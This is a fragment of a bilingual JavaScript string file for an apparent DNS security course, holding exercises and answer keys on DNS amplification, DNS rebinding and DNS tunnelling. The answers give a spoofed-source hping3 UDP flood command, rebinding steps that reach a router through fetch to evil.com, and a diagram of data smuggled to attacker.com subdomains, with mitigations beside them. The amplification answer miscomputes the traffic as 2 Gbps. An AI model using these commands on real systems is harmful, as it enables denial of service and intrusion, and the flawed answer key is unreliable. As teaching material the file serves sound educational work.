      'dns.ej6.q': { es: 'Un atacante envía queries DNS tipo ANY con IP origen spoofed (la víctima). Cada query pesa 40 bytes. Los resolvers abiertos responden con 4.000 bytes cada uno. El atacante usa 500 resolvers. ¿Cuánto tráfico recibe la víctima por segundo si el atacante dispara 1.000 queries/s? ¿Cuál es el factor de amplificación? ¿Qué comando usaría con hping3?', en: 'An attacker sends DNS ANY queries with a spoofed source IP (the victim). Each query is 40 bytes. Open resolvers reply with 4,000 bytes each. The attacker uses 500 resolvers. How much traffic does the victim receive per second if the attacker fires 1,000 queries/s? What is the amplification factor? What hping3 command would they use?' },
      'dns.ej6.ans': { es: 'FACTOR: 4.000 / 40 = ×100x\n\nTRÁFICO EN VÍCTIMA:\n  500 resolvers × 4.000 bytes × 1.000 q/s = 2 Gbps\n\nCOMANDO:\n  hping3 --udp --spoof [victim] -p 53 --flood [resolver]\n\nMITIGACIÓN:\n  - Deshabilitar queries tipo ANY\n  - Response Rate Limiting (RRL)\n  - Solo recursión para IPs internas', en: 'FACTOR: 4,000 / 40 = ×100x\n\nVICTIM TRAFFIC:\n  500 resolvers × 4,000 bytes × 1,000 q/s = 2 Gbps\n\nCOMMAND:\n  hping3 --udp --spoof [victim] -p 53 --flood [resolver]\n\nMITIGATION:\n  - Disable ANY queries\n  - Response Rate Limiting (RRL)\n  - Restrict recursion to internal IPs only' },
      'dns.ej7.title': "DNS Rebinding: why does the browser trust it?",
      'dns.ej7.q': { es: 'Explicá paso a paso cómo el DNS Rebinding viola la Same-Origin Policy. ¿Qué condición necesaria requiere el ataque (TTL)? ¿Qué recursos internos podría obtener un atacante? ¿Cómo se mitiga desde el resolver DNS?', en: 'Explain step by step how DNS Rebinding violates the Same-Origin Policy. What necessary condition does the attack require (TTL)? What internal resources could an attacker obtain? How can it be mitigated at the DNS resolver level?' },
      'dns.ej7.ans': { es: 'POR QUÉ FUNCIONA:\n1. SOP verifica (protocolo, dominio, puerto)\n2. evil.com TTL=1s → 1.2.3.4 (IP pública)\n3. JS malicioso se carga en el navegador\n4. TTL expira → evil.com rebind a 192.168.1.1\n5. fetch("http://evil.com/admin") llega al router\n\nRECURSOS EN RIESGO:\n  - Router admin (192.168.1.1)\n  - AWS metadata (169.254.169.254)\n  - APIs internas (10.x.x.x)\n\nMITIGACIÓN:\n  - DNS rebind protection en resolver\n  - Rechazar respuestas con IPs RFC1918', en: 'WHY IT WORKS:\n1. SOP checks (protocol, domain, port)\n2. evil.com TTL=1s → 1.2.3.4 (public IP)\n3. Malicious JS loads in browser\n4. TTL expires → evil.com rebinds to 192.168.1.1\n5. fetch("http://evil.com/admin") reaches router\n\nRESOURCES AT RISK:\n  - Router admin (192.168.1.1)\n  - AWS metadata (169.254.169.254)\n  - Internal APIs (10.x.x.x)\n\nMITIGATION:\n  - DNS rebind protection on resolver\n  - Reject RFC1918 responses from public resolvers' },
      'dns.rec.memcached': "Memcached exposed on UDP enabled the 1.7 Tbps DDoS attack against GitHub (2018). Factor ×51,000x. Fix: disable UDP with -U 0.",
      'dns.rec.rebinding': "Original work by Collin Jackson (Stanford) that popularized DNS Rebinding and demonstrated access to routers and internal APIs.",
      'dns.rec.t1498': "Reflection amplification attacks including DNS, NTP, Memcached and SSDP. Technique descriptions and mitigations.",
      'dns.rec.cf.amp': "Cloudflare technical explanation of DNS Amplification DDoS with real traffic examples.",
      'dns.s2.flow': "\nClient (browser)\n    ↓  \"What is the IP of example.com?\"\nRecursive resolver (ISP DNS or 8.8.8.8)\n    ↓  If not cached → asks the Root\nRoot Server (.)\n    ↓  \"Ask the .com TLD server\"\nTLD Server (.com)\n    ↓  \"Ask the authoritative server\"\nAuthoritative Server (example.com)\n    ↓  \"The IP is 93.184.216.34, TTL 3600s\"\nResolver → caches it → replies to the client\n          ",
      'dns.s5.flow': "\nVictim → query: SGVsbG8gV29ybGQ.attacker.com\nDNS → legitimate response (C2 server IP)\nThe C2 server decodes \"Hello World\" from the subdomain\n          ",
});
